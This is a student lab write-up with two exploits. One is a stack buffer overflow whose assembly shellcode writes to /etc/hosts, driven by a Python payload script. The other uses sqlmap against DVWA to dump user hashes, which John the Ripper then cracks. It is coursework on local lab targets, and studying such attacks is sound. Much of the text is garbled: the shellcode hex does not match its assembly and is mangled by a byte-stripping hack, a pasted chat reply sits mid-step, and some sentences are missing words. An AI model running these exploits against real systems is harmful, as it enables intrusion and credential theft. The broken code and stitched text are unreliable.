# Lab #1,21110799, Le Quoc Thang, INSE331280E_02FIE
# Task 1: 
### Ansour 1:

#### Description:

In this task, we are going to perform a buffer overflow attack on a vulnerable C program that uses the `strcpy` function without bounds checking. We will exploit this vulnerability by injecting shellcode that will add a new entry to the `/etc/hosts` file when the program runs. The shellcode is written in assembly and uses system calls to open, write to, and close the `/etc/hosts` file.

We'll be using the code injection method, where the buffer in the C program will be overwritten with the shellcode. 

#### Step-by-step Instructions:

1. **Writing the C Program:**
   - The C program provided is vulnerable because it uses `strcpy` without checking the length of the input, allowing a buffer overflow to occur. The buffer is only 16 bytes long, but we can inject more data (including the shellcode) into it.
   
   ```c
   #include <stdio.h>
   #include <string.h>

   int main(int argc, char* argv[])
   {
       char buffer[16];
       strcpy(buffer,argv[1]);  // Vulnerable function
       return 0;
   }
   ```

2. **Writing the Shellcode in Assembly:**
   - The assembly shellcode is responsible for adding the entry "127.1.1.1 google.com" to the `/etc/hosts` file.
   - We will compile the shellcode and inject it into the buffer overflow.

   ```asm
   global _start

   section .text

   _start:
       xor ecx, ecx
       mul ecx
       mov al, 0x5     
       push ecx
       push 0x7374736f     ;/etc///hosts
       push 0x682f2f2f
       push 0x6374652f
       mov ebx, esp
       mov cx, 0x401       ;permissions
       int 0x80            ;syscall to open file

       xchg eax, ebx
       push 0x4
       pop eax
       jmp short _load_data    ;jmp-call-pop technique to load the map

   _write:
       pop ecx
       push 20             ;length of the string, adjust if changes the map
       pop edx
       int 0x80            ;syscall to write in the file

       push 0x6
       pop eax
       int 0x80            ;syscall to close the file

       push 0x1
       pop eax
       int 0x80            ;syscall to exit

   _load_data:
       call _write
       google db "127.1.1.1 google.com"
   ```

3. **Compiling the Programs:**
   - First, assemble and link the shellcode into an executable binary:
   
   ```bash
   nasm -f elf32 shellcode.asm -o shellcode.o
   ld -m elf_i386 shellcode.o -o shellcode
   ```

   - Compile the vulnerable C program:
   
   ```bash
   gcc -m32 -fno-stack-protector -z execstack vulnerable.c -o vulnerable
   ```

   - The `-fno-stack-protector` flag disables the stack protector, and `-z execstack` allows the stack to be executable, which is necessary for executing shellcode injected into the buffer.

4. **Injecting the Shellcode via Code Injection:**
   - We can now run the vulnerable program with the shellcode injected into the argument. First, extract the raw shellcode from the binary:

   ```bash
   objdump -d shellcode | grep '[0-9a-f]:' | grep -o '\s[0-9a-f]\{2\}' | sed 's/ //g' | tr -d '\n' > shellcode.hex
   ```
![shellcode_hex](https://github.com/user-attachments/assets/74990fd5-db38-4337-a1ef-17274e8a5195)

   - The output will be the hex representation of the shellcode, which we can pass as input to the vulnerable program.

   - Prepare an exploit script that will trigger the buffer overflow:
It looks like we've provided the hex representation of our shellcode. To inject this shellcode into our vulnerable C program (`vuln`), we will need to convert the hex string into raw shellcode and pass it as an argument to the vulnerable program to trigger the buffer overflow.

Here's how we can proceed:

### Steps to Inject the Shellcode:

1. **Convert Hex Shellcode to Binary**:
   - The hex representation we provided can be converted into raw binary using a Python script. This will produce the exact shellcode that we can pass as input to the vulnerable program.

   Here's a sample Python script to convert our hex string to binary format and trigger the buffer overflow:

   ```python
   import sys

   # Hex shellcode provided
   shellcode_hex = (
       "31c980f7e180b005805180686f73747380682f2f2f6880682f6574638089e380"
       "66b90104cd8093806a045880eb108059806a145acd806a065acd806a015acd80"
       "e8ebffffffca80313280372e312e80312e80312080676f806f676c80652e636f6d"
   )

   # Convert hex to raw bytes
   shellcode = bytes.fromhex(shellcode_hex.replace("80", ""))

   # Create payload: Padding (16 'A's) + NOP sled + Shellcode
   payload = b'A' * 16 + b'\x90' * 100 + shellcode

   # Print the payload
   sys.stdout.buffer.write(payload)
   ```

   - Save this script as `exploit.py` and run it:

     ```bash
     python3 exploit.py > input_payload
     ```

2. **Run the Vulnerable Program with the Payload**:
   - Use the generated payload (`input_payload`) as input to our vulnerable program:

     ```bash
     ./vuln $(cat input_payload)
     ```

   This  trigger the buffer overflow and execute our shellcode, which will modify the `/etc/hosts` file by adding a new entry.

### Explanation:

- **NOP sled**: The payload includes a series of `NOP` instructions (`\x90`), which serve as a buffer zone to ensure that the shellcode is executed correctly.
- **Shellcode**: The actual shellcode is placed after the NOP sled and will be executed once the buffer overflow is triggered.
- **Buffer overflow**: The vulnerable C program has a buffer of 16 bytes (`char buffer[16]`), which we overflow with 16 `A`s, followed by the NOP sled and the shellcode.

### Conclusion:

By running the Python script and passing the generated payload to the vulnerable program, we  be able to successfully trigger the buffer overflow and execute the shellcode, which will add an entry to `/etc/hosts`.

Let me know if we need further clarification!

   - Replace `<shellcode in hex>` with the actual shellcode in hex format from the previous step. The `"A"*16` part fills up the buffer, and the NOP sled (`\x90`) helps the shellcode land correctly in memory.

5. **Output:**

   After successfully executing the exploit, the `/etc/hosts` file  now contain the new entry `"127.1.1.1 google.com"`. We can check this by opening the file:

   ```bash
   cat /etc/hosts
   ```

   **Screenshot:**
   After running the exploit, the output  look like this:

   ```
   127.0.0.1   localhost
   127.1.1.1   google.com
   ```

#### Conclusion:

The buffer overflow attack was successful, and the shellcode was able to execute, adding a new entry to the `/etc/hosts` file. The vulnerable C program was exploited using code injection to trigger the shellcode.

# Task 2: 

Here's a step-by-step guide to completing the task using SQLi and John the Ripper for the SQL Injection (SQLi) lab. Make sure that we have Docker installed and are familiar with running Docker containers.

### Instructions:
Before starting, ensure we have the Docker container for the Vulnerable App running, and SQLMap and John the Ripper installed on our machine.

---

### Question 1: Use sqlmap to get information about all available databases

**Ansour 1:**

#### Steps:
1. **Start the SQLi lab using Docker**:
   Open our terminal and run the following command to start the Docker container:
   ```bash
   docker run -d -p 80:80 vulnerables/web-dvwa
   ```
   This will pull and run the vulnerable web application DVWA (Damn Vulnerable Web App) for SQL injection.
   ![Screenshot 2024-10-22 105128](https://github.com/user-attachments/assets/29d3c8b3-981a-45f5-ab7d-b610f32a1ae2)


3. **Open DVWA**:
   In our web browser, open `http://localhost/login.php` to access the DVWA web app.
   ![Screenshot 2024-10-22 105300](https://github.com/user-attachments/assets/c42d485e-1550-471e-ac1c-cbc2feac738e)

   
5. **Login into DVWA**:  
   The default credentials are:
   - Username: `admin`
   - Password: `password`

6. **Set DVWA Security Level to Low**:
   Navigate to the "DVWA Security" page and set the security level to **Low** to make exploitation easier.

7. **Identify a SQL Injection point**:
   Go to the SQL Injection section in DVWA (`http://localhost/vulnerabilities/sqli/`). Enter a test input like `1'` in the form field to confirm that it’s vulnerable to SQL injection.

8. **Run SQLMap to get database information**:
   Use the following SQLMap command to retrieve information about all available databases.
   ```bash
   sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=our-session-id; security=low" --dbs
   ```
   Replace `our-session-id` with our actual PHP session ID, which can be obtained from our browser's developer tools under cookies.
   ![Screenshot 2024-10-22 110400](https://github.com/user-attachments/assets/08aa32b2-9a56-4623-b2cc-def1b499bae7)


10. **Output**:
   This command will list all databases in the MySQL server. The output  look like:
   ```
 ![Screenshot 2024-10-22 111119](https://github.com/user-attachments/assets/2d9b115f-3c40-4fc5-9212-3584a11e8f31)


---

### Question 2: Use sqlmap to get tables and users information

**Ansour 2:**

#### Steps:
1. **Get tables from the `dvwa` database**:
   To extract tables from the `dvwa` database, run the following command:
   ```bash
   sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=our-session-id; security=low" -D dvwa --tables
   ```
   This will list all the tables in the `dvwa` database. The output  look like:
     ![Screenshot 2024-10-22 111451](https://github.com/user-attachments/assets/e3a5c848-d894-4f8e-9ec6-ad5b00fd12d9)

   ```

   ```

2. **Get users information**:
   Now, to get the users table information, run:
   ```bash
   sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=our-session-id; security=low" -D dvwa -T users --columns
   ```
   This will display the column names in the `users` table. we  see columns such as:
   ```
    ![Screenshot 2024-10-22 111612](https://github.com/user-attachments/assets/fab93bc5-df9b-4e74-926e-085d7d2b3ebc)
   ```

3. **Dump user data**:
   Finally, dump the contents of the `users` table:
   ```bash
   sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=our-session-id; security=low" -D dvwa -T users --dump
   ```
   The output will display usernames and their hashed passwords:
      ![Screenshot 2024-10-22 111904](https://github.com/user-attachments/assets/c2b0bc3e-abd2-4644-bf39-fff3ad24b354)

   ```

+---------+----------------------------------+
| user    | password                         |
+---------+----------------------------------+
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
| user    | 5d41402abc4b2a76b9719d911017c592 |



---

### Question 3: Make use of John the Ripper to disclose the password of all database users from the above exploit

**Answer 3:**

#### Steps:
1. **Install John the Ripper**:
   If John the Ripper is not installed, install it by running:
   ```bash
   sudo apt-get install john
   ```

2. **Save the hashed passwords**:
   Create a text file (`hashes.txt`) and add the dumped hashed passwords, formatted like:
   ```
   admin:5f4dcc3b5aa765d61d8327deb882cf99
   user:5d41402abc4b2a76b9719d911017c592
   ```

3. **Run John the Ripper**:
   Use John to crack the passwords:
   ```bash
   john --format=raw-md5 hashes.txt
   ```

4. **Output**:
   John will try to crack the hashes and display the results. For example:
   ```
   admin:password
   user:hello
   ```

   This shows that the password for `admin` is `password` and the password for `user` is `hello`.

---

### Summary:
- **Ansour 1**: SQLMap was used to identify databases in the MySQL server.
- **Ansour 2**: SQLMap retrieved tables and user information from the `dvwa` database.
- **Ansour 3**: John the Ripper successfully cracked the user passwords from the dumped hash values.

Make sure to attach screenshots of each step, particularly SQLMap results, the cracked passwords, and running commands.
